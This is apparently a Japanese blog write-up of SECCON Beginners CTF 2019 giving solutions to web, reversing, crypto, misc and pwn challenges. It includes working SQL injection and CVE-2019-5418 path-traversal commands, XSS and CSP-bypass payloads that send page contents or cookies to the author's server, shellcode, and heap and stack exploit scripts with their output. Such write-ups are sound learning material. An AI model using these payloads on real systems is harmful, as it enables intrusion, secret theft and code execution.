---
date: 2019-05-26T22:47:00.000+09:00
slug: seccon-beginers-ctf-2019-writeup
title: SECCON Beginners CTF 2019 Writeup

---

個人で参加して 3 位。secconpass のフラグの Guess に失敗した結果 2 位を逃したのがちょっとだけ悔しい。
Pwn と Web では知らないことが問題に出てきて勉強になった。


# [warmup] Ramen (Web 73pts)


シンプルな SQLi があり、UNION を利用することで任意のカラム数 2 のクエリを実行できる。
information_schema からテーブル構造をリークしないといけないのかもしれないのだけど、とりあえず flag テーブルの flag カラムを取得したら、実際にフラグが存在した。


Web サイトに送信した文字列は以下の通り


```text
' UNION ALL SELECT flag, 1 FROM flag; --
```


# katsudon (Web 101pts)


Rails のバージョンから CVE-2019-5418 と推測したのは良いが、フラグページで得られた署名付き文字列の前半の Base64 をデコードしてみたら平文で保存されていた。


```text
$ echo -n BAhJIiVjdGY0YntLMzNQX1kwVVJfNTNDUjM3X0szWV9CNDUzfQY6BkVU--0def7fcd357f759fe8da819edd081a3a73b6052a | base64 -d
I"%ctf4b{K33P_Y0UR_53CR37_K3Y_B453}:ET
```


# katsudon-okawari (Web 469pts)


こちらは本当に CVE-2019-5418。katsudon の方にて「静的ファイルにて配信しております｡」という一文があったため、そこで`render file`が利用されていると推測して、Controller のソースコードと Secret を取得した。


```text
$ curl https://katsudon-okawari.quals.beginners.seccon.jp/flag -H 'Accept: ../../app/controllers/coupon_controller.rb{{'
class CouponController < ApplicationController
  def index
  end

  def show
    serial_code = params[:serial_code]
    msg_encryptor = ::ActiveSupport::MessageEncryptor.new(Rails.application.secrets[:secret_key_base][0..31], cipher: "aes-256-gcm")
    @coupon_id = msg_encryptor.encrypt_and_sign(serial_code)
  end
end

$ curl https://katsudon-okawari.quals.beginners.seccon.jp/flag -H 'Accept: ../../config/secrets.yml{{'
# (中略)
production:
  secret_key_base: 4e78e9e627139829910a03eedc8b24555fabef034a8f1db7443f69c4d4a1dbee7673687a2bf62d7891aa38d39741395b855ced25200f046c280bb039ce53de34%
```


適当な Rails プロジェクトで Rails console を起動してフラグの復号を行なった。


```text
irb(main):001:0> msg_encryptor = ::ActiveSupport::MessageEncryptor.new('4e78e9e627139829910a03eedc8b24555fabef034a8f1db7443f69c4d4a1dbee7673687a2bf62d7891aa38d39741395b855ced25200f046c280bb039ce53de34'[0..31], cipher: "aes-256-gcm")
irb(main):002:0> flag = 'bQIDwzfjtZdvWLH+HD5jhhZW4917cFKbx7LDRPzsL3JXqQ8VJp5RYfKIw5xqe/xhLg==--cUS9fQetfBC8wsV7--E8vQbRF4vHovYlPFvH3UnQ=='
irb(main):003:0> msg_encryptor.decrypt_and_verify(flag)
=> "ctf4b{06a46a95f2078ae095470992cd02f419}"
```


# Himitsu(Web 379pts)


クローラが動いているのと、報告画面があるので XSS 問題。
脆弱性は、以下の 2 点

- 他のページのタイトル埋め込み時には HTMLEscape されず、チェックもまだページが作成されていなければ走らない。
- ページのタイトルと作成時間、ユーザー ID からページ ID を事前に推測することが出来る。

具体的には次のようにして、Exploit 用のタイトルのページ ID を作成し、


```text
$ echo -n "ellie2019/05/25 17:46<script>fetch('/mypage').then(a=>a.text()).then(a=>{location.href='http://49.212.193.129/'+encodeURI(a)});</script>" | md5sum
6ee1f3d8754f7ac6cd5ebb6e64cd4345
# ユーザー名: ellie, 作成時間: 2019/05/25 17:46 所持サーバーのIP: 49.212.193.129
```


`[#6ee1f3d8754f7ac6cd5ebb6e64cd4345#]`を本文に含むページを作成した後、17:46 に`<script>fetch('/mypage').then(a=>a.text()).then(a=>{location.href='http://49.212.193.129/'+encodeURI(a)});</script>`がタイトルとなるページを作成したところ、最初に作成したページにアクセスしたユーザーがマイページの内容を送信するようになった。


これを管理者に報告すると、フラグページの ID`28a147ca4874466215662ac702c730cf`が降ってきたのでそのページを見てフラグを取得した。


# Secure Meyasubako (Web 433pts)


Cookie にフラグが含まれているため、XSS を行う必要がある。任意の内容のページを作成することが出来るが、CSP が存在し以下で指定されたドメイン以外からの script 以外利用できない。
`script-src 'self' www.google.com www.gstatic.com stackpath.bootstrapcdn.com code.jquery.com cdnjs.cloudflare.com`


CSP の Bypass で調べたところ、CDN が指定されている場合に angularjs などの古いバージョンを利用してバイパスする手法があることが分かったので、それを利用してフラグを奪取した。
参考： https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it’s-CSP!%22


```text
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().location.href="http://49.212.193.129/"+$on.curry.call().document.cookie}}
</div>
```


## [warmup] Seccompare (Reversing 57pts)


デコンパイル結果より、`ctf4b{5tr1ngs_1s_n0t_en0ugh}`であることがわかる。


```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char s1[29]; // [rsp+10h] [rbp-30h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( argc > 1 )
  {
    s1[0] = 'c';
    s1[1] = 't';
    s1[2] = 'f';
// 中略、
    s1[25] = 'g';
    s1[26] = 'h';
    s1[27] = '}';
    s1[28] = '\0';
    if ( !strcmp(s1, argv[1]) )
      puts("correct");
    else
      puts("wrong");
    result = 0;
  }
  else
  {
    printf("usage: %s flag\n", *argv, envp);
    result = 1;
  }
  return result;
}
```


## Leakage (Reversing 186pts)


デコンパイル結果より、enc_flag の内容を一文字ずつ convert 関数にかけた結果がフラグであることが分かる。


```c
__int64 __fastcall is_correct(const char *a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  if ( strlen(a1) != 34 )
    return 0LL;
  for ( i = 0; i <= 33; ++i )
  {
    if ( convert(enc_flag[i]) != a1[i] )
      return 0LL;
  }
  return 1LL;
}
```


convert 関数は読みたい長さではなかったので、gdb で挙動を観察したところ以下のことが分かった。

- 内部で状態を持っていて、純粋な関数ではない
- 最終的に入力値と XOR している
- 入力値に応じて内部状態が変化することはない

したがって、gdb で convert(0)の結果を 34 個取得し、それを enc_flag と XOR することでフラグが得られた。


```ruby
puts 'start'
34.times do
	puts "call (int)0x004006D0(0)"
end
```


```text
$ ruby test.rb | gdb ./leakage  > input
```


```ruby
e = [0xD3, 0x25, 0x8B, 0x96, 0x0F, 0x11, 0xE4, 0x2C, 0x8D, 0xD9, 0xD7, 0x7D, 0xF1, 0x21, 0x12, 0x31, 0x4F, 0x45, 0xCD, 0x89, 0xBF, 0xCD, 0xDD, 0x97, 0xE8, 0x92, 0x36, 0x34, 0xB8, 0xFC, 0xE2, 0x2B, 0x58, 0xA0]
conv = File.binread('input').strip[1..-1].scan(/ = ([0-9]+)/).map{|a|a[0].to_i}
p e.zip(conv).map{|e, i| i ^ e}.pack("C*")
```


```text
$ ruby solve.rb
ctf4b{le4k1ng_th3_f1ag_0ne_by_0ne}
```


## Linear Operation (Reversing 293pts)


Angr 問っぽい雰囲気を感じたので、Harekaze CTF 2019 の scramble の時のスクリプトをとりあえず実行してみたらフラグが得られた。


```python
import angr

project = angr.Project('./linear_operation')
entry = project.factory.entry_state()
simgr = project.factory.simgr(entry)
simgr.explore()

states = simgr.deadended
for state in states:
    flag = b"".join(state.posix.stdin.concretize())
    print(flag)
```


```text
(angr) angr@4dfacea123ca:/workdir$ python solve.py
(中略)
b'ctf4b{5ymbol1c_3xecuti0n_1s_3ffect1ve_4ga1nst_l1n34r_0p3r4ti0n}'
```


# SecconPass (Reversing 425pts)


0 で ID, Pass のペアの Entry を作成し、1 で表示、2 で削除が出来るアプリケーション。
0 で入力したペアがそのまま入るわけではなく、以下のパディング処理と暗号化処理が実行されている。


```c++
__int64 __fastcall Entry::Entry(Entry *a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v4; // rdx
  int v6; // [rsp+4h] [rbp-3Ch]
  __int64 v7; // [rsp+8h] [rbp-38h]
  int i; // [rsp+28h] [rbp-18h]
  int v9; // [rsp+2Ch] [rbp-14h]

  v7 = a3;
  v6 = a4;
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(a1, a2);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string((char *)a1 + 32, a2, v4);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(a1, a2);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=((char *)a1 + 32, v7);
  v9 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length((char *)a1 + 32) & 3;
  if ( v9 )
  {
    for ( i = 0; i < 4 - v9; ++i )
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::push_back((char *)a1 + 32, '@');
  }
  *((_DWORD *)a1 + 16) = v6;
  return Entry::encrypt(a1, v6);
}

bool __fastcall Entry::encrypt(Entry *this)
{
  bool result; // al
  _BYTE *v2; // rax
  _BYTE *v3; // rax
  _BYTE *v4; // rax
  _BYTE *v5; // rax
  int i; // [rsp+1Ch] [rbp-14h]

  for ( i = 0; ; i += 4 )
  {
    result = i < (unsigned __int64)(std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length((char *)this + 32)
                                  - 4);
    if ( !result )
      break;
    v2 = (_BYTE *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](
                    (char *)this + 32,
                    i);
    *v2 ^= *((_BYTE *)this + 67);
    v3 = (_BYTE *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](
                    (char *)this + 32,
                    i + 1);
    *v3 ^= *((_BYTE *)this + 65);
    v4 = (_BYTE *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](
                    (char *)this + 32,
                    i + 2);
    *v4 ^= *((_BYTE *)this + 67);
    v5 = (_BYTE *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](
                    (char *)this + 32,
                    i + 3);
    *v5 ^= *((_BYTE *)this + 65);
  }
  return result;
}
```


暗号化処理は最後の 4byte を除いた単純な 2byte 単位の XOR であることは分かったのだが、肝心のフラグの位置がまだ不明であった。


その後、呼び出されていない関数で id:ctf4b の Entry を作成しているのを見つけた。


```c++
unsigned __int64 destructor(void)
{
  char v1; // [rsp+Eh] [rbp-A2h]
  char v2; // [rsp+Fh] [rbp-A1h]
  char v3; // [rsp+10h] [rbp-A0h]
  char v4; // [rsp+30h] [rbp-80h]
  char v5; // [rsp+50h] [rbp-60h]
  unsigned __int64 v6; // [rsp+98h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  std::allocator<char>::allocator(&v2);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v4, &unk_39F0, &v2);
  std::allocator<char>::allocator(&v1);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v3, "ctf4b", &v1);
  Entry::Entry(&v5, &v3, &v4);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v3);
  std::allocator<char>::~allocator(&v1);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v4);
  std::allocator<char>::~allocator(&v2);
  std::vector<Entry,std::allocator<Entry>>::push_back(&ve, &v5);
  Entry::~Entry((Entry *)&v5);
  return __readfsqword(0x28u) ^ v6;
}
```


ここで、Pass として指定している unk_39F0 の内容について、2byte の Key を総当たりするプログラムを作成した。


```ruby
require 'ctf'
f = [0x54, 0x4D, 0x51, 0x0D, 0x55, 0x42, 0x7E, 0x54, 0x47, 0x55, 0x04, 0x54, 0x04, 0x57, 0x43, 0x0A, 0x53, 0x66, 0x75, 0x40, 0x68, 0x7A, 0x47, 0x08, 0x42, 0x0C, 0x47, 0x08, 0x42, 0x0C, 0x6D, 0]
128.times do |a|
    128.times do |b|
        p (f.pack("C*") ^ (a.chr + b.chr) * 100)
    end
end
```


```text
$ ruby solve.rb | grep ctf4b
"ctf4b{Impl3m3nt3d_By_Cp1u5p1u5Z9"
```


フラグのフォーマットになっていないので悩まされたが、これは作問ミスだったらしく修正後に投げたら通った。修正前に通したチームは凄い。


# [warmup] So Tired (Crypto 115pts)


Base64 と Zlib の Deflate の展開を交互に行う。


```ruby
require 'zlib'
e = File.read('encrypted.txt')
loop do
  e = e.unpack1('m')
  p e
  e = Zlib.inflate(e)
  p e
end
```


```text
$ ruby solve.rb
...
"ctf4b{very_l0ng_l0ng_BASE64_3nc0ding}"
```


# Party (Crypto 223pts)


多項式補完する。


```text
pts = [(5100090496682565208825623434336918311864447624450952089752237720911276820495717484390023008022927770468262348522176083674815520433075299744011857887705787, 222638290427721156440609599834544835128160823091076225790070665084076715023297095195684276322931921148857141465170916344422315100980924624012693522150607074944043048564215929798729234427365374901697953272928546220688006218875942373216634654077464666167179276898397564097622636986101121187280281132230947805911792158826522348799847505076755936308255744454313483999276893076685632006604872057110505842966189961880510223366337320981324768295629831215770023881406933), (3084167692493508694370768656017593556897608397019882419874114526720613431299295063010916541874875224502547262257703456540809557381959085686435851695644473, 81417930808196073362113286771400172654343924897160732604367319504584434535742174505598230276807701733034198071146409460616109362911964089058325415946974601249986915787912876210507003930105868259455525880086344632637548921395439909280293255987594999511137797363950241518786018566983048842381134109258365351677883243296407495683472736151029476826049882308535335861496696382332499282956993259186298172080816198388461095039401628146034873832017491510944472269823075), (6308915880693983347537927034524726131444757600419531883747894372607630008404089949147423643207810234587371577335307857430456574490695233644960831655305379, 340685435384242111115333109687836854530859658515630412783515558593040637299676541210584027783029893125205091269452871160681117842281189602329407745329377925190556698633612278160369887385384944667644544397208574141409261779557109115742154052888418348808295172970976981851274238712282570481976858098814974211286989340942877781878912310809143844879640698027153722820609760752132963102408740130995110184113587954553302086618746425020532522148193032252721003579780125)]

R.<x> = PolynomialRing(QQ)
print R.lagrange_polynomial(pts)
```


```text
$ sage solve.sage
8559415203809303629563171044315478022492879973152936590413420646926860552595649298493153041683835412421908115002277197166850496088216040975415228249635834*x^2 + 6759741750199108721817212574266152064959437506612887142001761070682826541920627672362291016337903640265385249474489124882116454124173716091800442011015857*x + 175721217420600153444809007773872697631803507409137493048703574941320093728
$ irb
irb(main):001:0> 175721217420600153444809007773872697631803507409137493048703574941320093728
=> 175721217420600153444809007773872697631803507409137493048703574941320093728 (0x63746634627b6a7573745f6430696e675f7368346d69727d20202020202020) "ctf4b{just_d0ing_sh4mir}       "
```


# Go RSA (Crypto 363pts)

- 1 を送信すると N-1 が手に入る。

```text
Encrypted flag is: 1161214023358150133916764496584789525513383230267959516994115278716755661372944325142970912719549163032608061456805570162974773272698715933444238285107572065806573563048234374539802364761760393591089206966189940051370409181494530290999356791845435866568345779217935988635696717916920343747563679039577538379979324259971881584130208831613522860834074080581852994437419695339451227402268422070057256341017262188017932017744918662113921185909887681580105826380353507272761944000961952958519198416800760612500261887479232174882676796413541965869410104375033677421076793789880455287366646017338009517568626330696476250728
> 1
1
> -1
14869646563399749295687947454576309786130977255521858002207618819814207485591612857905213969826798657104637605560406463875084815801154451958983631138525927048979908223467026266458666987232203490748849812996845216104093208649112542784641672948439019512774666801081819469383964268357104006798138538170729497213053557693267856956929557332156792004921693222147060959616116244070995223703454807538752998078511226357006917099893285942160104164371307555859229383904091075237472677448156880970892425761164772090428641510008892004500509937827058755145346094847662075960468609474898361188801166216581763292626906228914203156778
>
Bye
The D was 5303311393150521690608512501384968261303164050392418159873062274659158731223863755446182634706068202865004492002516756742240756893604897387571652566213055508229799576045871369641651008736523252403430360391660589914354863038655363764716335253319707067635001019401047473600878600005782215464542017352070300255614250377924372162479921236285545628697247860286402915197781669469861839535226794876322920575584435059209480861104269856840332158759157736657965838556767253156309528031977506735377719289253440876987453810109570993865443004564261294501750754790368063301739845628610151572972723632140023205009138894180024737441
```


```text
irb(main):001:0> enc = 1161214023358150133916764496584789525513383230267959516994115278716755661372944325142970912719549163032608061456805570162974773272698715933444238285107572065806573563048234374539802364761760393591089206966189940051370409181494530290999356791845435866568345779217935988635696717916920343747563679039577538379979324259971881584130208831613522860834074080581852994437419695339451227402268422070057256341017262188017932017744918662113921185909887681580105826380353507272761944000961952958519198416800760612500261887479232174882676796413541965869410104375033677421076793789880455287366646017338009517568626330696476250728
irb(main):002:0> n = 14869646563399749295687947454576309786130977255521858002207618819814207485591612857905213969826798657104637605560406463875084815801154451958983631138525927048979908223467026266458666987232203490748849812996845216104093208649112542784641672948439019512774666801081819469383964268357104006798138538170729497213053557693267856956929557332156792004921693222147060959616116244070995223703454807538752998078511226357006917099893285942160104164371307555859229383904091075237472677448156880970892425761164772090428641510008892004500509937827058755145346094847662075960468609474898361188801166216581763292626906228914203156778 + 1
irb(main):003:0> d = 5303311393150521690608512501384968261303164050392418159873062274659158731223863755446182634706068202865004492002516756742240756893604897387571652566213055508229799576045871369641651008736523252403430360391660589914354863038655363764716335253319707067635001019401047473600878600005782215464542017352070300255614250377924372162479921236285545628697247860286402915197781669469861839535226794876322920575584435059209480861104269856840332158759157736657965838556767253156309528031977506735377719289253440876987453810109570993865443004564261294501750754790368063301739845628610151572972723632140023205009138894180024737441
irb(main):004:0> enc.pow(d, n)
=> 159817516233124594390175867685847488474409848211524763952247677 (0x63746634627b66316e645f3768655f703472616d65743372737d) "ctf4b{f1nd_7he_p4ramet3rs}"
```


## Bit Flip(Crypto 393pts)


二つの暗号化結果をサーバーから得て、Franklin-Reiter Related Message Attack を実行。


```ruby
i0 = 6009027407243567335031931649428963919429154732907014370500400997771513937341041189191298488588290075356313589738563894185100451436779009492208623348644865528300927711013569794911546690801274429777563185946393101110307660340186162410632243944139679058717671950676594642209054525074839993622868204176669477619
i1 = 77438642725400555742777721622655700023110691946298580436565808387020878794148245172718129191205541306120475802959556454969217474908466793968505929601108525927965895730180605390309247460820445338794559642655288741915489723598167942830799370818357072850250783957331868542594066622321998814352235622866841497198
[-1, 1].each do |si|
  [-1,1].each do |sj|
    ts = []
    (0...256).each do |i|
      ts << Thread.start(i) do |i|
        p i
        (0...256).each do |j|
          s = <<EOS
n=82212154608576254900096226483113810717974464677637469172151624370076874445177909757467220517368961706061745548693538272183076941444005809369433342423449908965735182462388415108238954782902658438063972198394192220357503336925109727386083951661191494159560430569334665763264352163167121773914831172831824145331
a=#{i0}
b=#{i1}
da = #{si * 2 ** i.abs}
db = #{sj * 2 ** j.abs}
f = gcd(Mod((x+da)^3 - a,n), Mod((x+db)^3 - b,n))
f/pollead(f)
EOS
          File.write("test#{i}.gp", s)
          if `gp -f -q --test < test#{i}.gp`.lines[-1].strip != '1'
            puts 'Found!!!', i
            exit
          end
        end
      end
      if ts.size == 16
        ts.each(&:join)
        ts = []
      end
    end
  end
end
```


```text
$ ruby solve.rb
...
Found!!!
57
$ gp < test57.gp
...
%7 = Mod(1, 82212154608576254900096226483113810717974464677637469172151624370076874445177909757467220517368961706061745548693538272183076941444005809369433342423449908965735182462388415108238954782902658438063972198394192220357503336925109727386083951661191494159560430569334665763264352163167121773914831172831824145331)*x + Mod(82212154592315489750110187598968636841905821953623851870053845076997511568524415687534405445330110037385522700226033733612223434284079949332614038131717774815337863135195292470488899872185912270098336585556230191588353421626879687269516794206695695261382394134796460782655757781698300248930147328811110240937, 82212154608576254900096226483113810717974464677637469172151624370076874445177909757467220517368961706061745548693538272183076941444005809369433342423449908965735182462388415108238954782902658438063972198394192220357503336925109727386083951661191494159560430569334665763264352163167121773914831172831824145331)

$ irb
irb(main):001:0> 82212154608576254900096226483113810717974464677637469172151624370076874445177909757467220517368961706061745548693538272183076941444005809369433342423449908965735182462388415108238954782902658438063972198394192220357503336925109727386083951661191494159560430569334665763264352163167121773914831172831824145331 - 82212154592315489750110187598968636841905821953623851870053845076997511568524415687534405445330110037385522700226033733612223434284079949332614038131717774815337863135195292470488899872185912270098336585556230191588353421626879687269516794206695695261382394134796460782655757781698300248930147328811110240937
irb(main):002:0> ['%x' % _].pack('H*')
=> "ctf4b{b1tfl1pp1ng_1s_r3lated_m3ss4ge} DUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUMMYDUM\xCFYDUMMY\n"
```


# [warmup] Welcome (Misc 51pts)


IRC に入る。


# containers (Misc 71pts)


foremost で PNG を抽出して一文字ずるフラグを取得した。


```text
$ foremost e35860e49ca3fa367e456207ebc9ff2f_containers
$ gpicview output/png
```


# Dump (Misc 138pts)


hexdump の結果が HTTP を流れている。tcpflow で取り出して、hexdump の結果を Ruby でパースした。最後 16byte の処理をちゃんとしていないので、tar でエラーになるがフラグは問題なく表示できた。


```text
$ tcpflow -r fc23f13bcf6562e540ed81d1f47710af_dump
$ irb
irb(main):001:0> File.binwrite('hoge', File.read('192.168.075.230.00080-192.168.075.001.65314').scan(/((\d\d\d\s){16})/).map{|a|  a[0].split.map{|b|b.to_i(8)}}.flatten.pack("C*"))
$ tar xvf hoge
./._flag.jpg
flag.jpg

gzip: stdin: unexpected end of file
tar: Child returned status 1
tar: Error is not recoverable: exiting now
```


# Sliding puzzle (Misc 206pts)


最初に BFS で全てのステートへの移動方法を計算しておき、入力が来るたびにそれを逆順にして表示する。この手の探索は Ruby はちょっと苦手な気がする。


```ruby
require 'ctf'

def read(s)
  s.expect("----------------\n")

  arr = []
  3.times do
    arr << s.gets.split('|')[1..-2].map{|a|a.to_i}
  end
  s.expect("----------------\n")
  arr
end

def solve(board)
  state = Hash.new
  state[board] = ''
  queue = [board]
  dy = [-1, 0, 1, 0]
  dx = [0, 1, 0, -1]
  while !queue.empty?
    board = queue.shift
    y = board.index{|a|a.include?(0)}
    x = board[y].index(0)
    4.times do |i|
      nx = x + dx[i]
      ny = y + dy[i]
      if 0 <= nx && nx < 3 && 0 <= ny && ny < 3
        n_board = board.map{|a|a.dup}
        n_board[y][x], n_board[ny][nx] = n_board[ny][nx], n_board[y][x]
        next if state.include?(n_board)
        state[n_board] = state[board] + i.to_s
        queue.push n_board
      end
    end
  end
  state
end
state = solve([[0,1,2], [3,4,5],[6,7,8]])

TCPSocket.open('133.242.50.201', 24912) do |s|
  s.echo = true
  while true
    board = read(s)
    s.print state[board].reverse.tr('0213', '2031').chars.join(',') + "\n"
  end
  s.interactive!
end
```


# [warmup] shellcoder (Pwnable 291pts)


warmup ってこれだったっけ…。


入力したシェルコードを実行してくれるが、’binsh’のどれかの文字列が含まれているとリジェクトされてしまう。適当に binsh の部分に XOR を取って回避した。


```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-8h]

  buf = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
  puts("Are you shellcoder?");
  read(0, buf, 0x28uLL);
  if ( strchr((const char *)buf, 'b')
    || strchr((const char *)buf, 'i')
    || strchr((const char *)buf, 'n')
    || strchr((const char *)buf, 's')
    || strchr((const char *)buf, 'h') )
  {
    puts("Payload contains invalid character!!");
    _exit(0);
  }
  ((void (*)(void))buf)();
  return 0;
}
```


```ruby
require 'ctf'
D = 0x2020202020202020
shellcode = Metasm::Shellcode.assemble(Metasm::X86_64.new, <<SOURCE).encoded.data
mov r15, #{0x68732f6e69622f ^ D}
mov r14, #{D}
xor r15, r14
push r15
mov rdi, rsp
xor rdx,rdx
xor rsi,rsi
mov al, 59
syscall
SOURCE
p shellcode
TCPSocket.open(*ARGV) do |s|
    s.echo = true
    s.puts shellcode
    s.interactive!
end
```


```text
$ ruby solve.rb 153.120.129.186 2000
(中略)
Are you shellcoder?
cat flag.txt
ctf4b{Byp4ss_us!ng6_X0R_3nc0de}
```


# OneLine (Pwnable 376pts)


1 回目の write で write のアドレスをリークさせ、そこから libc のアドレスを計算、2 回目の read で write の向き先を one_gadget RCE へ飛ばす


```ruby
require 'ctf'

libc_write = 0x0000000000110140
libc_og = 0x4f322

TCPSocket.open(*ARGV) do |s|
    s.echo = true
    s.expect("You can input text here!\n>> ")
    s.print 'a'
    s.flush
    write_ptr = s.read(40).unpack("Q*")[-1]
    p '%x' % write_ptr
    s.print "/bin/ls\0"+"\0" * 24 + [write_ptr - libc_write + libc_og].pack("Q*")
    s.interactive!
end
```


```text
$ ruby solve.rb  153.120.129.186 10000
You can input text here!
>> aa@Qb5W"7f5735625140"
/bin/ls"CV5WOnce more again!
>> cat flag.txt
ctf4b{0v3rwr!t3_Func7!on_p0int3r}
```


# memo (Pwnable 386pts)


alloca に負数を渡すことで、上手く return address の書き替えが可能になる。


```ruby
require 'ctf'

TCPSocket.open(*ARGV) do |s|
    s.echo = true
    s.expect('Input')
    s.puts "-96"
    s.expect('Input')

    s.puts 'a' * 8 + [0x4007c1].pack('q') 
    s.interactive!
end
```


```text
$ ruby solve.rb 133.242.68.223 35285
Input-96
 size : Inputaaaaaaaa�@
 Content : Your Content : 1�I��^H��H���PTI��@
cat flag.txt
ctf4b{h4ckn3y3d_574ck_b0f}
```


# babyheap (Pwnable 448pts)


https://github.com/shellphish/how2heap を参考にして解いた。まだ、glibc のヒープの構造の理解が甘く、どうして動くのかは勉強中。


```ruby
require 'ctf'

LIBC_STDIN = 0x00000000003eba00
LIBC_FREEHOOK = 0x00000000003ed8e8
LIBC_SYSTEM = 0x4f322 # 実はOne Gadget
def alloc(s, data)
    s.expect('> ')
    s.print '1' + ' ' * 46
    s.print data
    s.flush
    sleep 0
end

def free(s)
    s.expect('> ')
    s.print '2' + ' ' * 46
end
def wipe(s)
    s.expect('> ')
    s.print '3' + ' ' * 46
end
TCPSocket.open(*ARGV) do |s|
    s.echo = true
    s.sync = true
    libc_addr =  s.expect(/>>>>> (.+) <<<<</)[1].to_i(16) - LIBC_STDIN
    p 'libc: %x' % libc_addr
    freehook_addr = libc_addr + LIBC_FREEHOOK
    p 'freehook: %x' % freehook_addr

    # alloc
    alloc(s, ' ')

    # free x2
    free(s)
    free(s)
    
    # alloc
    wipe(s)
    alloc(s, [freehook_addr].pack('q'))

    wipe(s)
    alloc(s, [libc_addr + LIBC_SYSTEM].pack('q'))

    wipe(s)
    alloc(s, [libc_addr + LIBC_SYSTEM].pack('q'))

    free(s)
    s.interactive!
end
```


```text
$ ruby solve.rb 133.242.68.223 58396
(中略)
cat flag.txt
ctf4b{h07b3d_0f_51mpl3_h34p_3xpl017}
```

